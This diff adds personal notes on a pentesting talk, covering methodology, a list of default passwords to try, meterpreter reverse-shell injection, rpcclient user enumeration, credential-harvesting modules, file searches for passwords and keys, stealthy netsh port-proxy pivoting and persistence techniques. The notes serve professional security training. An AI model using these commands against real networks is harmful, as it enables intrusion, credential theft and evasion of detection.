@@ -313,6 +313,261 @@ We need the nmap.xsl as it is the stylesheet for the xml file
 - snoof app - for spoofing phone numbers
   
 - padgeant - putty feature that saves crts for ssh
+** [[https://www.youtube.com/watch?v=xXqyogdxITE][The Dirty Little Secrets They Didn't Teach You In Pentesting Class]]
+- Domain Admin or Bust
+  - Usually this means adding yourself as one (aka fastest way to get caught)
+
+- Pentesting Goals
+  - What's out goal?
+  - Vulnerability Driven vs Data Driven vs Capability Driven pentest/goal
+  - What's a *good* goal?
+    - Domain Admin is "A Goal" but it's a stupid goal
+    - What makes the client money is a better goal (if you can identify it)
+    -Problems arise in actually identifying this. What's important to testers vs client vs bad guys
+    - Best goal, testing client's ability to detect and respond to various levels of attackers
+      
+- Majority of 'Pentesting' going on today
+
+Run Scanner ---> Exploit ---> Report
+
+this is useless, the evidence is need to identify where the failures occured
+
+- A Better Way
+  
+Intelligence Gathering ---> Foot Printing ---> Vulnerability Analysis ---> Exploitation ---> Post-Exploitation ---> Clean up
+
+- Actual Attack Scenarios
+
+Prepwork/Analysis ---> Intel Gathering ---> Targeting ---> Exploitation ---> Post-Exploitation
+
+- Prep Work
+  - make your click scripts
+  - update your stuff
+  - have script and screen ready to go  
+
+- Tips
+  - screen/tmux so you don't lose your shell
+  - use script to log all of the session
+  - One of these passwords almost always works
+    - password
+    - Password
+    - pssw0rd
+    - Password123
+    - welcome
+    - welcome123
+    - $Company1
+    - $Comapany123
+    - changeme123
+    - p@ssw0rd
+    - p@ssw0rd123
+    - Username123
+      
+  - Nmap Scripts
+    - Best scripts don't fire off automatically with "-A"
+    - Some of the better scripts...
+      - Citrix, NFS, AFP, SNMP, LDAP
+      - Database coverage
+      - http*
+      - Losts of handy stuff, some overlap with MSF aux but some things sux doesn't have.
+	
+  - MSF Auxiliary Modules
+    - Handles all the BS for you
+    - Uses lib/rex == "Ruby EXploitation library"
+      - Basic lib for most tasks
+      - Sockets, protocols, command shell interface
+      - SSL, SMB, HTTP, XOR, Base64, random text
+      - Intended to be useful outside of the framework
+    - Lib/rex ported to a ruby gem
+      - can make use of rex outside of MSF
+    - Designed to help with reconnaissance
+    - Dozens of useful service scanners
+    - Simple module format, easy to use
+    - Specify THREADS for concurrency
+      - Keep this under 16 for native Windows
+      - 256 is fine on Linux
+   - Uses RHOSTS instead of RHOST 	
+
+- Post-Exploitation
+  Mubix docs on post-exploitation
+  - http://www.room362.com/blog/9/6/post-exploitation-command-lists.html
+  - http://bitly.com/qrbKQP
+    
+  - Best persistence method?
+    - Meterpreter
+      - HTTPS
+      - Pro's Persistence Agent
+    - MOS_DEF?
+      - Thunderbird SPAM Persistence
+      - DNS, HTTP, HTTPS, etc
+    - CORE Agent?
+    - Wiz-bang custom binary/backdoor
+    - RAT
+  Better Method
+    - RDP/VNC to outward facing box 
+      - MyPasswords.txt will be kept on the fileshare somewhere
+
+  - Send shells to team mates
+    - run multi_meter_inject -pt windows/meterpreter/reverse_tcp -mr 1.2.3.4 -p 80
+    - always have a spare shell
+      
+- Find Stuff Internally
+  - Good
+    - Nmap - up load to a target
+    - Ping
+    - Nessus 
+    - Nexpose
+    - "net view / domain"
+
+  - Better
+    - OSQL (MS binary should cause any problems to install)
+      - osql -L 
+         - will let you know all the SQL servers it knows about
+         - can use it to connect to databases
+
+    - DSQUERY / DSGET (annoying)
+      - dsquery computer -limit 0 - current domain
+      - dsquery user -limit 0
+      - dsquery computer -limit 0 "DC=company,DC=net"
+      - dsquery user -limit 0 "DC=company,DC=net" - other domains
+    - the above can be done with adfind (this is DSQUERY on steroids)
+      
+    - nltest
+      
+  - BEST
+    - Railgun - provides the windows API
+    - NetDiscovery (part of MSF) - SQL, DC, UNIX, Novell selections
+    - DomainDiscovery
+      - what domains do you have acces to?
+      - Are they domains?
+      - What are the names of all their domain controllers? 
+	
+- User Discovery
+  - Good
+    - net group "domain admins" /domain
+    - net group "domain admins" /domain:DM
+    - net localgroup  Administrators
+    - net group localgroup Administrators /domain
+    - net user domainadmin_username /domain
+    - net user username/domain
+      
+  - Better
+  - Rpcclient
+    - Enumerate users
+      #+BEGIN_EXAMPLE
+      #!/bin/bash
+      for i in {500..600}
+      do
+        rpcclient -U "user%Password1" -W DOMAiN 1.2.3.4 -c "lookupsids S-1-5-21-1289870925-1615939633-2792171844-$i
+      done	
+      #+END_EXAMPLE
+      
+  - BEST
+    - UserDiscovery
+    - DisplaySessions
+    - PVE-Find-AD-User
+    
+  - Creating Zombies
+    - RunAs
+      - ShellExecute
+      - CreateProcessWith
+      - Logon, LogonUser
+    - WCE+ (can cause system to crash)
+    - runhash32/64 - user level psexec == zombie user & token
+      
+  - Run executable in memory
+  #+BEGIN_EXAMPLE
+  meterpreter > execute -H -l -c -m -f bins/newbinary.exe
+  #+END_EXAMPLE
+  this will start a binary on the target remove and replace it with the desired binary on the host
+  
+- Privilege Escalation
+  - Good
+    - getsystem
+      - use the options or you will use your shell
+    - Post modules
+      - Keyboard layout
+      - Bypassuac
+    - Core Impact /Canvas ship with locals
+      
+  - Better
+    - DomainDrop
+
+  - BEST
+    - Just ask for it...
+    - Ask module
+    - Tasklist
+      - tasklist /V /S $IP /U $user /P $password
+    #+BEGIN_EXAMPLE
+    for /F "skip=3 delims=\ " %A in ('net view') do tasklist /V /S %A /U $user /P $password
+    #+END_EXAMPLE
+    
+- Finding the Gold
+  - Dir /s "My Documents"
+  - Dir /s "Desktop"
+  - Dir /s *.pcf
+  - ListDrives
+    
+Searching for files
+  - dir c:\*password* /s
+  - dir c:\*competitor* /s
+  - dir c:\*finance* /s
+  - dir c:\*risk* /s
+  - dir c:\*assessment* /s
+  - dir c:\*.key* /s
+  - dir c:\*.ica /s
+  - dir c:\*.crt /s
+  - dir c:\*.log /s
+  - dir c:\*.vsd /s
+    
+Searching in files
+  - findstr
+    - password
+    - secret
+    - confidential
+    - account
+      
+  - Better
+    - Dumplinks
+    - GetFirefoxCreds
+    - GetPidginCreds
+    - Outlook, IE, Chrome, RDP Password Extraction
+      - Basically the whole credentials post module section
+    - SharePoint
+    - Intranet.company.com
+      
+  - BEST
+    - OpenDLP
+    - Fiction's Database Searcher
+    - Search in Meterpreter
+      - Uses windows indexing ie outlook email
+    - Dir /s $share > filetosearchoffline.txt
+      - Findstr
+	
+- Pivoting
+  - Portforwarding
+    - Meterpreter portfwd
+    - Route
+    - Sock4a module + meterperter session
+    - Pro VPN Pivot
+  - Portproxy
+    - Built into Windows
+    #+BEGIN_EXAMPLE
+    netsh interface protproxy>add v4tov4 listenport=25 connectionaddress=192.168.0.100 connectionport=80 protocol=tcp
+    #+END_EXAMPLE
+    will not show on netstat
+  - Legitimate Access via VPN, Term Server, Citrix, etc
+    
+- Persistence
+  - Autoruns
+  - Smartlocker - http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html
+  - Fxsst.dll
+    - https://blog.mandiant.com/archives/1786
+    - http://www.room362.com/blog/2011/6/27/fxsstdll-persistence-the-evil-fax-machine.html
+  - gpo_dropper hbgary
+  - IPv6 Dropper
+
+https://github.com/mubix/Not-In-Pentesting-Class
+
 * Tutorial
 ** PluralSight - System Hacking - Dale Meredith
 
